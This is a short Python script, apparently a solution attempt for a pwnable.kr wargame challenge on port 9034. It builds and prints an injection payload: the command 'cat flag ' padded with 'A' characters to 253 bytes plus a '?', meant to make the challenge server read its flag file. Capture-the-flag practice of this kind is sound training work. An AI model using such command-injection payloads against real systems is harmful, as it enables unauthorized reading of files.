import socket, struct

HOST='pwnable.kr'
PORT=9034

def main():

	cmd = 'cat flag '
	payload = cmd + ('A' * (253 - len(cmd))) + '?'
	
	print (payload)

	return


if __name__ == '__main__':
	main()